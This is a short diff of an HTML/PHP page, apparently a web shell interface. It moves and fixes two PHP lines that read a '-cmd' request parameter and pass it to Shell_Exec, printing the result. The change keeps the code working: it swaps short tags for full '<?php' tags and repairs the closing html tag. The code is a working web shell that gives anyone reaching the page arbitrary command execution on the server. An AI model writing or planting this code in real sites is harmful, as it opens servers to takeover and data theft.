@@ -10,9 +10,9 @@
 style="background:#000000;color:#ffffff;">
 <hr>
 <pre>
-<? $cmd = $_REQUEST["-cmd"];?>
-<? if($cmd != "") print Shell_Exec($cmd);?>
 </pre>
 </form>
+<?php $cmd = $_REQUEST["-cmd"];?>
+<?php if($cmd != "") print Shell_Exec($cmd);?>
 </body>
-</html
+</html>
